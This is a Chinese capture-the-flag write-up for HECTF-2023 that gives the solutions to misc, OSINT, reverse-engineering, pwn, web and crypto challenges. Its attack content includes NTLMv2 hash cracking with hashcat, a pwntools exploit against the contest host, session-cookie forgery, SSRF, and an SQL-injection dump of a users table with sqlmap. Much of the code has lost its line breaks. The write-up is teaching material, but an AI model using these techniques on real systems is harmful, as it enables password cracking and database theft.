# HECTF-2023 WriteUp

> 原文: https://www.ctfiot.com/147010.html
> ID: 147010

Misc

无需多言

HECTF{Welcome_To_HECTF_2023}

Osint

HECTF{河北省邯郸市永年区永年太极广场}

密码：X2z0Um23RF

压缩包数据：

导出gif图片

黑桃->s 红桃->h 梅花->c 红尖->d

得到密码。根据牌

https://www.bilibili.com/video/BV1Lj41187kx/

一共b站视频，对应图片binwalk出的密码。

small joker -> kafbig joker -> wi1

最后在农民的牌得到flag图片

HECTF{Dou_di_Zhu_uhZ_id_uoD_hEccctf_TY6d145A57R7WVz}

跟据提示得到密码

百度网盘是二维码拼图：

直接拼，才24张

恭喜weber获得最后的flag：

HECTF{java_ca_fei_bao_bei}

打开压缩包

发现很明显的是

NTLM的流量包

第一步先过滤

ntlmssp这一字符串进行数据包筛选，获得身份验证的握手包。

查找NTLMSSP_AUTH包。将数据包向下过滤到Security Blob层，就可以得到如下好东西：

将域名和用户名复制到文本文档中。

深入查找NTLM响应部分，找到NTProofStr字段和NTLMv2的响应。将它们作为十六进制字符串复制到文本文档中。

NTLMv2Response是从ntlmProofStr开始，因此从NTLMv2的响应中删除ntlmProofStr。

在Wireshark的搜索过滤器中输入ntlmssp.ntlmserverchallenge。就会发现NTLM Server Challenge字段，通常这个数据包是在NTLM_Auth数据包之前。将该值作为十六进制字符串复制到文本文档。

将以上的所有值按以下格式保存到crackme.txt：

username::
domain:
ServerChallenge:
NTproofstring:
modifiedntlmv2response

利用hashcat爆破

hashcat -m 5600 crackme.txt rockyou.txt

得到密码  qwe123!@#

md5加密得到flag

HECTF{fca812f055d5fdcd3a355b63ceaad991}

Re

一眼顶真，循环异或

HECTF{T31s_1s_A_mAg1ca1_3h1ng}

hook出他的密文，一眼顶针是个迷宫

分析代码，发现他的默认变换改成了hjkl，对应的变换一下啊就可以了

HECTF{jjjjjljjjlljlllkklkkkhhh}

分析代码可知就是abcdef的操作都来了一遍，除了c那个有个异或其他都是替换，没啥用，直接写脚本

a = [0x4d, 0x42, 0x44, 0x51, 0x3f, 0x7c, 0x4f, 0x6a, 0x58, 0x74, 0x34, 0x62, 0x6a, 0x74, 0x58, 0x6f, 0x34, 0x73, 0x7e, 0x58, 0x74, 0x36, 0x6a, 0x75, 0x69, 0x34, 0x7a]
for i in range(len(a)):    a[i] = (a[i] + 1) ^ 6    print(chr(a[i]),end='')

HECTF{Vm_s3ems_v3ry_s1mpl3}

pwn

from pwn import *
r = remote("101.133.164.228",30380)pl = '-4294967230'r.sendline(pl)
r.interactive()

web

抓包一步步做

session伪造的cookie key为zxk1ing

eyJrZXkiOiJ6eGsxaW5nIiwidXNlcm5hbWUiOiJ6eGsxaW5nIn0.ZVgYag.z2BMF2B8kyQS7DC41cdDPeTvtCE

之后访问/P1aceuWillneverkn0w

只有一个图片，访问图片发现存在url

测试发现ssrf漏洞

直接读取flag

什么？投菜村长一票就送遥遥领先手机（sort传参）

打开页面，404的大字在眼前

发包会发现注释里有个404.php

访问

跳转的投票界面

测了好久发现是sql注入，太不明显了！！！！

sqlmap直接索了

1.txt

POST /404.php HTTP/1.1Host: 101.133.164.228:
32385User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/119.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 6Origin: http://101.133.164.228:
32385Connection: closeReferer: http://101.133.164.228:
32385/404.phpCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExIn0.YrHwWF1RRyxqpta2G-dnwRRjoq53lCOLYVxv4l_BLMI; seed=976696390Upgrade-Insecure-Requests: 1
sort=1

python3 sqlmap.py -r 1.txt -D ctf -T users  -dump -batch

得到flag

HECTF{Jia_You_Weber}

Crypto

得到seed

114514

#脚本1#Sage
import binascii
def attack(c1, c2, n, e):    PR.<x>=PolynomialRing(Zmod(n))    # replace a,b,c,d    g1 = (30509*x+13601)**e - c1    g2 = (92095*x+27065)**e - c2
    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]c = 23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259n = 25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241c1 = 5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313c2 = 17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040e = 17m1 = attack(c1, c2, n, e)print(binascii.unhexlify("%x" % int(m1)))

HECTF{r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck}

from Crypto.Util.number import long_to_bytes, bytes_to_long
encrypted_message = b'xa1x14xa66x9cx88xe3xeco?xe2x95xbdxcdx1a2)ixf5_)x15Hxf2yxecx8dxfc*KUxefvxddxd0X'
# 逆向 circular_shift_left 函数
def circular_shift_left(int_value, k, bit=32):    bin_value = bin(int_value)[2:].zfill(32)    bin_value = bin_value[k:] + bin_value[:k]    int_value = int(bin_value, 2)    return int_value
def dec_block(block):    block ^= 3279553481    block = circular_shift_left(block, 21)    block ^= 1909693462    block = long_to_bytes(block)    return block
# 逆向 convert 函数
def myfill(num,fill_num):
    return bin(num)[2:].zfill(fill_num)
n1 = myfill(2245263360,32)n2 = myfill(2029229568,32)def reverse_convert(c):    # 先将字节块转换为16进制字符串，然后去掉前缀 '0x'，最后填充至32位    c = c.hex()    c = myfill(int(c, 16), 32)
    #4    m1 = int(c[:13],2)^int(c[-13:],2)    m1 = myfill(m1,13)    c = c[:19]+m1
    #3    m1 = int(c[:15],2)^(int(c[-15:],2)&int(n1[:15],2))    m1 = myfill(m1,15)    c = m1+c[15:]
    #2    m1 = c[-9:]    m2 = int(c[-18:-9],2)^(int(m1,2)&int(n2[-18:-9],2))    m2 = myfill(m2,9)    m3 = int(c[-27:-18],2)^(int(m2,2)&int(n2[-27:-18],2))    m3 = myfill(m3,9)    m4 = int(c[:5],2)^(int(m3[-5:],2)&int(n2[:5],2))    m4 = myfill(m4,5)    c = m4+m3+m2+m1
    #1    m1 = int(c[13:26],2)^int(c[:13],2)    m1 = myfill(m1,13)    m2 = int(m1[:6],2)^int(c[-6:],2)    m2 = myfill(m2,6)    c = c[:13]+m1+m2
    return int(c, 2)

# 解密整个消息
def my_decblock(encrypted_message):    assert len(encrypted_message) % 4 == 0    decrypted_message = b''    IV = bytes_to_long(b'retu')    blocks = [encrypted_message[i:i + 4] for i in range(0, len(encrypted_message), 4)]
    # 解密每个块    for i in range(len(blocks)):        block = bytes_to_long(blocks[i])        block ^= IV        block = dec_block(block)        block = reverse_convert(block)  # reverse_convert 现在返回整数        IV = bytes_to_long(blocks[i])  # 更新 IV 为当前块的密文        decrypted_message += long_to_bytes(block, 4)  # block 现在是整数
    return decrypted_message
# 解密得到flagflag = my_decblock(encrypted_message)print("Recovered flag:", flag)

Recovered flag: b'HECTF{spodjoqw321jp3ij09adfiosofrga}'

根据题目描述，每是个字符为一组，从第一组开始偏移一位，其他组依次递增

偏移的话就是凯撒

写出脚本

def caesar_cipher_decrypt(char, shift):    # 将字符转换为其ASCII码值    ascii_value = ord(char)    # 减去偏移量    shifted_value = ascii_value - shift    # 将偏移后的ASCII码值转换回字符    return chr(shifted_value)
def split_and_decrypt(text, group_size):    groups = [text[i:i+group_size] for i in range(0, len(text), group_size)]    decrypted_groups = []    for i, group in enumerate(groups):        shift = i + 1        decrypted_group = ''.join(caesar_cipher_decrypt(char, shift) for char in group)        decrypted_groups.append(decrypted_group)    return decrypted_groups
# 示例字符串input_text = "zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx}szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom"# 按照要求分组和解密result = split_and_decrypt(input_text, 10)
# 输出结果for i, group in enumerate(result):    print(f"Group {i+1}: {group}")

HECTF{STOP_Nuclear_sewage}

from Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesxor_result = 113271863767201424639329153097952947311122854394813183532903131317262533549675encrypted_flag = b'_1x16xc2;xb1xddyx14xddx14xe5{x19x04:'xor_result_bytes = long_to_bytes(xor_result)key_high = xor_result_bytes[:16]secret_key = key_high + key_highxor_result_low = xor_result_bytes[-16:]init_vector = bytes(a ^ b for a, b in zip(secret_key[:16], xor_result_low))cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)decrypted_flag = cipher.decrypt(encrypted_flag)print(f"Decrypted flag: {decrypted_flag}")
# Decrypted flag: b'RSAKEYISFTCEHx00x00x01'

压缩包密码 FTCEH

e=65537n=: 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c=:
7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172没了 真没了 加油少年

很小，n直接分解

得到第二个key

keyisEa51stRsA

gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTj
dPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBY
S1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg
4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8
gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+X
qweu
DES CBC PKCS7 key：hectf iv：0000

你知道么？梵蒂冈的常住人口只有800人，同时，仅澳大利亚就有4700万只袋鼠。如果袋鼠决定入侵梵蒂冈，那么每一个梵蒂冈人要打58750只袋鼠，你不知道！你不在乎！你只关心你自己的flagHECTF{DES_RSA_AES_WOMENSA_ZHENQIANG}

长

按

关

注

网络安全社团公众号

微信号 : qlnu_ctf

新浪微博：齐鲁师范学院网络安全社团


```
HECTF{Welcome_To_HECTF_2023}
HECTF{河北省邯郸市永年区永年太极广场}
密码：X2z0Um23RF
https://www.bilibili.com/video/BV1Lj41187kx/
small joker -> kafbig joker -> wi1
HECTF{Dou_di_Zhu_uhZ_id_uoD_hEccctf_TY6d145A57R7WVz}
恭喜weber获得最后的flag：

HECTF{java_ca_fei_bao_bei}
HECTF{fca812f055d5fdcd3a355b63ceaad991}
HECTF{T31s_1s_A_mAg1ca1_3h1ng}
HECTF{jjjjjljjjlljlllkklkkkhhh}
a = [0x4d, 0x42, 0x44, 0x51, 0x3f, 0x7c, 0x4f, 0x6a, 0x58, 0x74, 0x34, 0x62, 0x6a, 0x74, 0x58, 0x6f, 0x34, 0x73, 0x7e, 0x58, 0x74, 0x36, 0x6a, 0x75, 0x69, 0x34, 0x7a]
for i in range(len(a)):    a[i] = (a[i] + 1) ^ 6    print(chr(a[i]),end='')
HECTF{Vm_s3ems_v3ry_s1mpl3}
from pwn import *
r = remote("101.133.164.228",30380)pl = '-4294967230'r.sendline(pl)
r.interactive()
POST /404.php HTTP/1.1Host: 101.133.164.228:
32385User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
109.0) Gecko/20100101 Firefox/119.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 6Origin: http://101.133.164.228:
32385Connection: closeReferer: http://101.133.164.228:
32385/404.phpCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjExIn0.YrHwWF1RRyxqpta2G-dnwRRjoq53lCOLYVxv4l_BLMI; seed=976696390Upgrade-Insecure-Requests: 1
sort=1
HECTF{Jia_You_Weber}
114514
#脚本1#Sage
import binascii
def attack(c1, c2, n, e):    PR.<x>=PolynomialRing(Zmod(n))    # replace a,b,c,d    g1 = (30509*x+13601)**e - c1    g2 = (92095*x+27065)**e - c2
    def gcd(g1, g2):        while g2:            g1, g2 = g2, g1 % g2        return g1.monic()    return -gcd(g1, g2)[0]c = 23001012057110779471190091625946693776382380529397302126337301229214301450335125076016991835054198112255974220434689958104931664098817350134656616154892781885504255726632558690544057380195511404078662094726952602350250840712610362029824982069179543810686494204685887486972937880502875441232004432323308734978847464589775857815430854038396134952486665687531579988133729365443247597395131516449487146786214227230853061720614077115599878358089377114269765796099004940883513036567103436154122335792598432012140232905658895014924069330265282364249236142072335363164451294973492092043110680377767954710822286121195290921259n = 25797576442752368834409243494498462987370374608513814739930733437032797864549696772439769896270235017474841764016848627149724764584643408544417890463920153063835758878658712790547466715525246861709503145754424896044647787146006099053059124466248594151765065039034244830614724509092882854620642569723528913880146979990993657935598837645247839225413889995373643109990149255485373119338024345925311643249141660177285328457994476509430988280481564046398593906405870633323621548853838399385539924067139236445142933316057900841508972844270649504321178274091144241788883353514769368447833090379142367062327674855735832181241c1 = 5702553209026762891130621254037294747819864952568824327221430749829654552175171307151888953348659971422228556686092434932000213695492351602755144510029319044193567051613888876933660356756790444392278614143455408803808095980542751023095024106689759843322130186219560734082292015929006937318400901378373771587448471762923415750064340829545587346927358411518874090282598069394946985795177419501659425500481799157093068337225389827654860680897913114945871197415129055139716514884716404289565297854681809258375973195355836553939670482515484347869258398517276876478311544109924573128946617113822561968330536525876279165313c2 = 17562619948191690401152271053920025392401205523418067246455197241332062181407775133406742024747779181762812656501246379566147855594504112107873162350649668441267907193889705868572309785100582281795380779594946422800722070311908572538672508371123334385630310655242811756206073131919770939609347021343765434127086363844595938894714892990053114153402729297796655717510572619694559203260762574159375142757462082162882775921182437134358375300674547217425590072112733480640372328934982979603312597484512120618223179217692002851194538130349201457319160001114007059615596355221194709809437500052122684989302563103918409825040e = 17m1 = attack(c1, c2, n, e)print(binascii.unhexlify("%x" % int(m1)))
HECTF{r3411y_easy_R4nd0m_And_r3l4ted_m3554ge_att4ck}
from Crypto.Util.number import long_to_bytes, bytes_to_long
encrypted_message = b'xa1x14xa66x9cx88xe3xeco?xe2x95xbdxcdx1a2)ixf5_)x15Hxf2yxecx8dxfc*KUxefvxddxd0X'
# 逆向 circular_shift_left 函数
def circular_shift_left(int_value, k, bit=32):    bin_value = bin(int_value)[2:].zfill(32)    bin_value = bin_value[k:] + bin_value[:k]    int_value = int(bin_value, 2)    return int_value
def dec_block(block):    block ^= 3279553481    block = circular_shift_left(block, 21)    block ^= 1909693462    block = long_to_bytes(block)    return block
# 逆向 convert 函数
def myfill(num,fill_num):
    return bin(num)[2:].zfill(fill_num)
n1 = myfill(2245263360,32)n2 = myfill(2029229568,32)def reverse_convert(c):    # 先将字节块转换为16进制字符串，然后去掉前缀 '0x'，最后填充至32位    c = c.hex()    c = myfill(int(c, 16), 32)
    #4    m1 = int(c[:13],2)^int(c[-13:],2)    m1 = myfill(m1,13)    c = c[:19]+m1
    #3    m1 = int(c[:15],2)^(int(c[-15:],2)&int(n1[:15],2))    m1 = myfill(m1,15)    c = m1+c[15:]
    #2    m1 = c[-9:]    m2 = int(c[-18:-9],2)^(int(m1,2)&int(n2[-18:-9],2))    m2 = myfill(m2,9)    m3 = int(c[-27:-18],2)^(int(m2,2)&int(n2[-27:-18],2))    m3 = myfill(m3,9)    m4 = int(c[:5],2)^(int(m3[-5:],2)&int(n2[:5],2))    m4 = myfill(m4,5)    c = m4+m3+m2+m1
    #1    m1 = int(c[13:26],2)^int(c[:13],2)    m1 = myfill(m1,13)    m2 = int(m1[:6],2)^int(c[-6:],2)    m2 = myfill(m2,6)    c = c[:13]+m1+m2
    return int(c, 2)

# 解密整个消息
def my_decblock(encrypted_message):    assert len(encrypted_message) % 4 == 0    decrypted_message = b''    IV = bytes_to_long(b'retu')    blocks = [encrypted_message[i:i + 4] for i in range(0, len(encrypted_message), 4)]
    # 解密每个块    for i in range(len(blocks)):        block = bytes_to_long(blocks[i])        block ^= IV        block = dec_block(block)        block = reverse_convert(block)  # reverse_convert 现在返回整数        IV = bytes_to_long(blocks[i])  # 更新 IV 为当前块的密文        decrypted_message += long_to_bytes(block, 4)  # block 现在是整数
    return decrypted_message
# 解密得到flagflag = my_decblock(encrypted_message)print("Recovered flag:", flag)
Recovered flag: b'HECTF{spodjoqw321jp3ij09adfiosofrga}'
def caesar_cipher_decrypt(char, shift):    # 将字符转换为其ASCII码值    ascii_value = ord(char)    # 减去偏移量    shifted_value = ascii_value - shift    # 将偏移后的ASCII码值转换回字符    return chr(shifted_value)
def split_and_decrypt(text, group_size):    groups = [text[i:i+group_size] for i in range(0, len(text), group_size)]    decrypted_groups = []    for i, group in enumerate(groups):        shift = i + 1        decrypted_group = ''.join(caesar_cipher_decrypt(char, shift) for char in group)        decrypted_groups.append(decrypted_group)    return decrypted_groups
# 示例字符串input_text = "zpvepoudbsgcdqwvjgocqg|rxrqo|feviefsyx}szwt|skqfl?NKIZLYZUVfU|jslhyfzmiom"# 按照要求分组和解密result = split_and_decrypt(input_text, 10)
# 输出结果for i, group in enumerate(result):    print(f"Group {i+1}: {group}")
HECTF{STOP_Nuclear_sewage}
from Crypto.Cipher import AESfrom Crypto.Util.number import long_to_bytesxor_result = 113271863767201424639329153097952947311122854394813183532903131317262533549675encrypted_flag = b'_1x16xc2;xb1xddyx14xddx14xe5{x19x04:'xor_result_bytes = long_to_bytes(xor_result)key_high = xor_result_bytes[:16]secret_key = key_high + key_highxor_result_low = xor_result_bytes[-16:]init_vector = bytes(a ^ b for a, b in zip(secret_key[:16], xor_result_low))cipher = AES.new(secret_key, AES.MODE_CBC, init_vector)decrypted_flag = cipher.decrypt(encrypted_flag)print(f"Decrypted flag: {decrypted_flag}")
# Decrypted flag: b'RSAKEYISFTCEHx00x00x01'
e=65537n=: 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c=:
7650350848303138131393086727727533413756296838218347123997040508192472569084746342253915001354023303648603939313635106855058934664365503492172没了 真没了 加油少年
keyisEa51stRsA
gIHkeIlRQp1fLeSWEqZJdOTO4aRYRB2OGRcBycHQ1OAdi6UEULYbwIvYh+0alYScSEoN4TOejgTj
dPsetrURRlLX6dcifjX6VvLxY7TnMk7c8/xy17mybq/yNQf0vFGh8byC88bUeHian9dA2Qh6rRBY
S1I7iNxM62RtCFZ+1OKeaqGIDjf3/VuPlbnCePYIY5FVs6xNXjkGh0m57t2QW4CoGI5lz6OcAAwg
4AHP0d8CfeldOF/TogPwOiPaRlDbtHXCh54Bs5ZivV+jDerr0RQvCGYBFHYLJnvyrFtyZC9BxAQ8
gQnGlWNDjE1V6BByUvJjpI9DcUyRSNN21rUWouOiLwtKX0BgDQkGH9PhtzhmGYI+R3lZJ4x30l+X
qweu
DES CBC PKCS7 key：hectf iv：0000
你知道么？梵蒂冈的常住人口只有800人，同时，仅澳大利亚就有4700万只袋鼠。如果袋鼠决定入侵梵蒂冈，那么每一个梵蒂冈人要打58750只袋鼠，你不知道！你不在乎！你只关心你自己的flagHECTF{DES_RSA_AES_WOMENSA_ZHENQIANG}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1700748458.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/6-1700748458.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1700748459.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/7-1700748459.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/0-1700748460.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/3-1700748461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/2-1700748461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/1-1700748461.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/4-1700748462.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/11/7-1700748462.png)